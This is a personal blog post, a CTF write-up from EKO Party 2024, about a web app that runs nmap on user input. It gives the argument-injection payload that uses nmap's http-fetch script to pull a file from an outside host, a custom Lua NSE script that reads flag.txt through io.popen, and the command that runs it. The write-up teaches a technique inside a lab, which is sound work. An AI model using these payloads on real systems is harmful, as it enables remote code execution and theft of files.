+++
date = '2024-12-02T17:11:00-03:00'
draft = false
title = 'Kulkan Writeup - EKO Party CTF 2024'
tags = ['writeup', 'ctf', 'command-injection']
+++

Hi! I hope this finds you well on the other side of the screen :) 
TLDR; if you just want to focus on the write-up, you can skip the context section ;) 

## Context

This is my first write up, and also my first post on my site, so I would like to provide some context. My name is Julian, I work as a cybersecurity engineer at a payments startup. I have always enjoyed offensive cybersecurity and penetration testing, but never really focused on it until earlier this year. And as part of this journey, I also started playing CTFs.

This month I had the opportunity to help at the Eko Party Cyber Security Conference in Buenos Aires, Argentina (where I live). It's the biggest cybersecurity conference in Latin America.
The conference was amazing, there were a lot of great talks and the energy of the people there was amazing. I really enjoyed it.
Like almost every cybersec conference, it had a CTF! So of course I signed up. I signed up as a team with my coworkers, but they couldn't make it to the conference, and since they were working while I was there, they didn't have a lot of time to participate in the CTF remotely. 
So since I was on my own and spent most of the day at the conference bouncing between amazing talks, I didn't have a lot of time to focus on the CTF. Anyway, I really enjoyed one of the challenges, so I thought it was a great excuse to write my first post. So here we are.

As I said, I'm just starting out on the "offensive" side of cybersecurity, so I'm writing this as I'd like to be explained if I were on the other side of the screen. Although I have no doubt that anyone reading it, regardless of their expertise, will find something useful here.

## Hands on

This is the challenge. We have a web application where our task is "see if you can find a way to **cat** the flag". They give us a URL of an instancer that gives us 2 minutes to find the flag, but for testing and finding the vulnerability, they give us a zip with the source code.

![](/kulkan1.png)

This is what the instancer looks like:

![](/kulkan2.png)

The downloaded code has a python application and a docker file. So I build the docker image, run it, and when we access the provided URL we find a web application like this:

![](/kulkan3.png)

It asks for a target (hostname/IP) and we can choose a command: ping, dig or nmap.

So it's kind of obvious that we should try to find some kind of command injection here to cat the flag.

I started with the "ping" and "dig" commands. I tried a bunch of different command injection payloads from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/command-injection), but none of them worked. I also tried some of these payloads with the nmap command, also with no result. 

At this point I started to think it wasn't the usual command injection, so I started reading documentation about the options and flags of these commands. 

Meanwhile, being a bit curious, I opened the python file running the server for the challenge and found that the code used the `shlex.split()` method to sanitize the command before executing it. 
After some research, I found out that this is a very safe way to execute commands through Python. 
I'm a Python developer, so this ended up being useful to learn. And it also confirmed my theory that this was not a common command injection vulnerability. 
(Some may think it was cheating to see the code since it was supposed to be a black-box challenge, but in my defense, looking at the code only confirmed the theory I already had).

Did some research on the options and flags for each command. Didn't find anything useful for `ping` and `dig`. When I started to do some research for the `nmap` command, I remembered the `--script` flag that allows us to run some custom scripts with nmap on the target host. So I thought maybe there was already a script that could help me. 

After reading the [Nmap Scripts Doc](https://nmap.org/nsedoc/scripts/) I found that the [http-fetch](https://nmap.org/nsedoc/scripts/http-fetch.html) script might be useful.
This script allows us to retrieve files from servers. 

The first thing I did was try to use this script from the challenge web application. 
Since I was running it locally, I started a Python http server locally:

![](/kulkan4.png)

and started ngrok:
`ngrok http 127.0.0.1:9000`.

And executed the `nmap` command with the payload:
```
--script http-fetch --script-args http-fetch.url=test.txt,http-fetch.destination=/tmp/test e52d-181-164-0-217.ngrok-free.app 
```

And it worked!

![](/kulkan5.png)

But when I opened the downloaded file...

![](/kulkan6.png)

It wasn't what I expected ("this is a test file"). Instead, it downloaded the ngrok warning page. 
So, looking for alternatives, I ended up hosting the file in a public repo on Github, and it worked as expected!

Ok, so now we can upload files to the server... but what can we do with them? 
After some research, re-reading the [Nmap Scripts Doc] (https://nmap.org/nsedoc/scripts/), I didn't find anything useful...
But after a while I had an idea... I can write my own Nmap NSE script to catch the flag!

One important thing to know is whether it is possible to run nse scripts that are not stored in the nmap scripts folder. And yes, it is:

![](/kulkan7.png)

So I started reading the [Nmap script writing tutorial](https://nmap.org/book/nse-tutorial.html) and with that and a lot of help from ChatGPT I ended up with this NSE script:

``` lua
-- Define the description and category
description = [[
  This script reads the content of a file called 'flag.txt' in the current directory.
]]
categories = {"discovery", "intrusive"}

-- Import necessary libraries
local stdnse = require("stdnse")

-- Define the rule function to specify when this script should run
hostrule = function(host)
  return true  -- Always run on specified target
end

-- Define the main action function
action = function(host)
  -- Execute a command to read the file content
  local file = io.popen("cat flag.txt", "r")
  if not file then
    return "Error: Could not read file"
  end

  -- Read file content
  local content = file:read("*a")
  file:close()

  if content then
    return "flag.txt content:\n" .. content
  else
    return "Error: No content found in flag.txt"
  end
end
```

And hosted it in the Github repository I created earlier.

So now we have everything ready, we just need to try it out.

First, I downloaded the nse script into the target as we did before.

![](/kulkan8.png)

In the scan result we can get the full location where it was downloaded. So with the full location of our nse script we can now run it:
```
nmap www.google.com --script /tmp/flag-reader/185.199.111.133/443/jstrah00/expose-files/master/%2fjstrah00%2fexpose-files%2fmaster%2fflag-reader.nse
```
(when running it in the web application, we omit the `nmap`)

And it worked!

![](/kulkan9.png)

So now we replicate this in the "production environment" and we have our flag :)

## Conclusion
This was a really fun challenge. In my opinion it is a bit hard to be classified as easy as it is. 
As a person just starting out in CTFs, it was the first time I had to build a "custom" script to solve one, and I really liked the challenge. 
I learned a lot from it, especially these key points:
- Using `shlex.split()` is a great way to safely execute commands in Python.
- Ngrok is not always the best way to expose files. 
- Now I can write my own custom NSE scripts!
- Nmap is POWERFUL.

So that was it! I hope you enjoyed reading this and learned something new.
If you have any questions, comments, or anything else you want to discuss, feel free to contact me!

Thanks for reading! Have a nice day!
